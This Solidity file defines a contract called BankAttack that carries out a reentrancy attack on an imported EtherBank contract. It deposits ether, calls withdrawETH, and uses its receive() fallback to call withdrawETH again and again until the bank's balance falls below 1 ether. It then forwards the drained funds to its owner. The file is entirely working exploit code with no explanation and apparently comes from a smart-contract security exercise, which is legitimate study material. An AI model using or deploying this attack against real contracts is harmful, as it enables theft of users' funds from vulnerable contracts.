// SPDX-License-Identifier: MIT

import {EtherBank} from "./EtherBank.sol";

contract BankAttack {
    EtherBank public bank;
    address public owner;

    constructor(address _bank) payable {
        bank = EtherBank(_bank);
        owner = msg.sender;
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdrawETH();
        } else {
            payable(owner).call{value: address(this).balance}("");
        }
    }

    function attack() public payable {
        bank.depositETH{value: msg.value}();
        bank.withdrawETH();
    }

    function withdraw() public {
        payable(owner).call{value: address(this).balance}("");
    }

    function getBalance() public view returns (uint256) {
        return address(bank).balance;
    }
}
